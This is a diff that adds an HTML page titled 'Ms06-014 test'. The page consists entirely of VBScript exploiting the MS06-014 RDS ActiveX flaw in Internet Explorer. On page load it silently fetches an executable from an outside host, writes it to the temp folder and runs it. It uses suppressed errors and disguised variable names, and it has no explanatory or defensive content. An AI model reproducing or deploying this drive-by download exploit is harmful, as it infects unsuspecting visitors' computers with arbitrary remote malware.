@@ -1,0 +1,33 @@
+<html>
+<head>
+<title>Ms06-014 test</title></head>
+<body>
+<Script Language="VBSCRIPT">
+On error resume next
+dl1234567890="http://ruanjian2008.kki.com/xzz.exe"
+Set df1234567890 = document.createElement("object")
+df1234567890.setAttribute "classid","clsid:BD96C556-65A3-11D0-
+983A-00C04FC29E36"
+str1234567890="Microsoft.XMLHTTP"
+Set x1234567890 = CreateObject(str1234567890)
+Set x1234567890 = CreateObject(str1234567890)
+Set S1234567890 =CreateObject("adodb.stream")
+S1234567890.Type = 1
+x1234567890.open"GET",dl1234567890,False
+x1234567890.Send()
+fname11234567890 ="123.exe"
+Set F1234567890 = CreateObject("Scripting.FileSystemObject")
+Set tmp1234567890 = F1234567890.GetSpecialFolder(2)
+fname11234567890 = F1234567890.BuildPath(tmp1234567890, 
+fname11234567890)
+S1234567890.open
+S1234567890.write x1234567890.responseBody
+S1234567890.SaveToFile fname11234567890, 2
+S1234567890.Close
+Set Q1234567890 = CreateObject("Shell.Application")
+Q1234567890.ShellExecute fname11234567890
+</Script>
+</body>
+</html>
+
+
